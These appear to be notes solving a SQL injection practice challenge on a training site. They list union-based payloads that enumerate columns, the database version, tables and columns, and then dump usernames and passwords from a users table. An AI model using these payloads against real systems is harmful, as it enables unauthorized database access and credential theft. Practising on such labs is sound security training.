http://leettime.net/sqlninja.com/tasks/deathrow_ch4.php?id=1")%23

id=-1")%23

order by 7%23
--found 7 columns

union select 1,2,3,4,5,6,7
--column 4 visible

union select null,null,null,version(),null,null,null
--5.6.47-cll-lve

union select null,null,null,database(),null,null,null
--leettime_761wHole


union select null,null,null,table_name,null,null,null from information_schema.tables where table_schema=database() limit 0,1
--testtable1
--userlogs
--users

union select null,null,null,column_name,null,null,null from information_schema.columns where table_schema=database() and table_name =('users') limit 0,1
-- id
-- username
-- password
-- user_type
-- sec_code

union select null,null,null,group_concat(username,0x09,password,0x0a),null,null,null from (select username,password from users limit 0,10)a

 --injector khan
 --decompiler hacktract
 --devilhunte dante
 --Zen sec-idiots
 --Zenodermus security-i
 --grayhat hacker
 --khan haxor
 --admin sadmin